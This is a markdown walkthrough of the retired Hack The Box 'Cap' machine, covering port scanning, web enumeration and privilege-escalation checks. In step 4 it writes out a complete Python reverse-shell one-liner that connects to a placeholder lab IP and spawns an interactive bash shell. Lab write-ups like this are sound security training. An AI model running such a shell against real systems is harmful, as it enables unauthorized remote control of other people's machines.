# 🧪 Hack The Box — Cap (Easy) Walkthrough

This repository contains my **Hack The Box** machine walkthrough for the *Cap* (Easy, Linux) box. The steps documented here replicate what I demonstrated in my YouTube video.

> **Important:** This walkthrough is for **educational purposes only**. Do not use these techniques on machines you do not have permission to test.

---

## 🧠 Overview

- **Machine Name:** Cap  
- **Platform:** Hack The Box  
- **Difficulty:** Easy  
- **OS:** Linux  
- **Goal:** Capture **User** and **Root** flags  
- **Run Type:** Retired HTB Machine (for educational learning)

---

## 🚀 Tools Used

Make sure you have the following tools installed:

| Purpose | Tool |
|----------|------|
| Scanning & Enumeration | `nmap` |
| Web Content Discovery | `dirb` / `gobuster` |
| HTTP Exploitation | Browser & `curl` |
| Shell & Post‑exploitation | `ssh`, `python`, `nc` |
| Privilege Escalation | `LinPEAS`, manual checks |

---

## 🛠 Step‑by‑Step Walkthrough

Below is the general attack path used against *Cap*.

---

### 🔍 1. Initial Recon — Scan for Open Ports

```bash
nmap -sC -sV -oA nmap/initial 10.10.X.X
```

This scan identifies open ports and running services such as HTTP and SSH.

---

### 🌐 2. HTTP Enumeration

Navigate to the web service in your browser:

```text
http://10.10.X.X
```

Browse available pages and functionality while looking for hidden directories or exposed endpoints.

Optional directory enumeration:

```bash
gobuster dir -u http://10.10.X.X -w /usr/share/wordlists/dirb/common.txt
```

---

### 📦 3. Find Entry Point

During enumeration, a misconfiguration is discovered within the web application that exposes sensitive functionality.  
This information can lead to credentials, access tokens, or other attack paths.

---

### 🔓 4. Exploit User Access

Once valid access is identified, credentials are leveraged to gain user access to the system.

If required, a reverse shell can be spawned:

```bash
python3 -c "import socket,subprocess,os; s=socket.socket(); s.connect(('10.10.X.X',4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(['/bin/bash','-i'])"
```

---

### 📁 5. User Flag Capture

After gaining a shell, navigate to the user directory and retrieve the flag:

```bash
cat /home/youruser/user.txt
```

---

### ⚡ 6. Privilege Escalation

Local enumeration is performed to identify escalation vectors:

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

Automated tools such as `linpeas.sh` can assist in identifying misconfigurations.

---

### 🔐 7. Root Flag Capture

After successfully escalating privileges, retrieve the root flag:

```bash
cat /root/root.txt
```

---

## 📄 Notes & Observations

- Focused service enumeration revealed the initial attack surface  
- Web misconfiguration played a key role in gaining access  
- Privilege escalation was achieved through system misconfiguration and enumeration  

---

## 💡 Learning Outcomes

Completing this machine helped reinforce:

- Structured scanning and enumeration techniques  
- Importance of web content discovery  
- Manual exploitation workflow  
- Linux post‑exploitation and privilege escalation fundamentals  

---

## 🎥 Video Walkthrough

Full walkthrough video:  
https://www.youtube.com/watch?v=7HdQ3ZoxclA&t=9s
